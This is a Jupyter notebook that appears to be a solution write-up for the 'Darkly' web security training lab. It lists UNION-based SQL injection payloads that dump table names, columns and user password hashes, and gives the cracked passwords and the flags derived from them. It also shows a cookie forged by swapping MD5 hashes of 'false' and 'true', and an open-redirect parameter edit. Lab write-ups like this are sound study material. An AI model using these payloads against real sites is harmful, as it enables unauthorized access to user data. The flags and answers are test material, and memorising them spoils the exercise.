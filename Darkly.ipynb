{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "ccea90a7-8592-456f-8cf5-0b233f7f1ad3",
   "metadata": {},
   "source": [
    "# <center>Darkly</center>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b0a106b0-de48-4470-a783-39db2022e7a5",
   "metadata": {},
   "source": [
    "***\n",
    "## <center>1 - SQL Injection in search member page</center>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4741dd6f-c529-4b8c-8adb-da561bfc1615",
   "metadata": {},
   "source": [
    "| ID | Query                                                                                                                      |\n",
    "|----|----------------------------------------------------------------------------------------------------------------------------|\n",
    "| 1  | ```1 union all select 1, 2```                                                                                              |\n",
    "| 2  | ```1 union all select 1,group_concat(table_name) from Information_schema.tables where table_schema=database()```           |\n",
    "| 3  | ```1 union all select 1,group_concat(column_name) from Information_schema.columns where table_schema=database()```         |\n",
    "| 4  | ```1 union all select 1,group_concat(Commentaire) from users```                                                            |\n",
    "| 5  | ```1 union all select 1,group_concat(countersign) from users```                                                     |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "20e0b52f-25ab-4922-9efd-d73063bde5ca",
   "metadata": {},
   "source": [
    "5ff9d0165b4f92b14994e5c685cdce28 -> FortyTwo"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "b1637691-818d-47d2-8397-d61b9b5bae41",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[92mFlag 1 : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5 \u001b[0m\n"
     ]
    }
   ],
   "source": [
    "import hashlib\n",
    "\n",
    "print(\"\\033[92mFlag 1 :\", hashlib.sha256(b\"fortytwo\").hexdigest(),\"\\033[0m\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "08193f3b-a732-44ef-b363-75056c3cc03e",
   "metadata": {},
   "source": [
    "***\n",
    "## <center>2 - SQL Injection in search image page</center>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "45cb81bc-cfa1-4beb-9f78-e003d85b1826",
   "metadata": {},
   "source": [
    "| ID | Query                                                                                                                      |\n",
    "|----|----------------------------------------------------------------------------------------------------------------------------|\n",
    "| 1  | ```1 union all select 1, database()```                                                                                     |\n",
    "| 2  | ```1 union all select 1,group_concat(table_name) from Information_schema.tables where table_schema=database()```          |\n",
    "| 3  | ```1 union all select 1,group_concat(column_name) from Information_schema.columns where table_schema=database()```      |\n",
    "| 4  | ```1 union all select 1,group_concat(comment) from list_images```                                                           |\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4868e2cf-bdba-4195-a07b-77a9ede50342",
   "metadata": {},
   "source": [
    "1928e8083cf461a51303633093573c46 -> albatroz"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "82d04fd7-f88e-47d3-8c3b-ddc655ae994e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[92mFlag 2 : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188 \u001b[0m\n"
     ]
    }
   ],
   "source": [
    "import hashlib\n",
    "\n",
    "print(\"\\033[92mFlag 2 :\", hashlib.sha256(b\"albatroz\").hexdigest(),\"\\033[0m\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1c3038ea-b072-4458-9533-10d2082d6ad1",
   "metadata": {},
   "source": [
    "***\n",
    "## <center>3 - Cookie</center>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d4cf7257-63a7-4a32-a977-42ae20f95713",
   "metadata": {},
   "outputs": [],
   "source": [
    "68934a3e9455fa72420237eb05902327 -> false | true -> b326b5062b2f0e69046810717534cb09"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c62d077a-3723-4070-bf26-953af9b2be2b",
   "metadata": {},
   "source": [
    "<img src=\"assets/cookie.png\" alt=\"Description de l'image\" style=\"display: block; margin-left: auto; margin-right: auto;\">"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a7d56411-10b7-4ea6-8b26-1c0d67d6e19d",
   "metadata": {},
   "source": [
    "***\n",
    "## <center>4 - Redirections</center>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c70d2faa-f1c2-436a-9629-8b18ede8136f",
   "metadata": {},
   "source": [
    "From : ```<a href=\"index.php?page=redirect&amp;site=twitter\" class=\"icon fa-twitter\"></a>```<br>\n",
    "To   : ```<a href=\"index.php?page=redirect&amp;site=www.google.com\" class=\"icon fa-twitter\"></a>```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e48222ad-e80e-4755-9fe9-f2e24c948dac",
   "metadata": {},
   "source": [
    "<img src=\"assets/redirection.png\" alt=\"Description de l'image\" style=\"display: block; margin-left: auto; margin-right: auto;\">"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9c7699e2-d684-4ca2-be89-1efb5b56db31",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2ee2bb14-1f9e-4702-a857-43aed5b12168",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
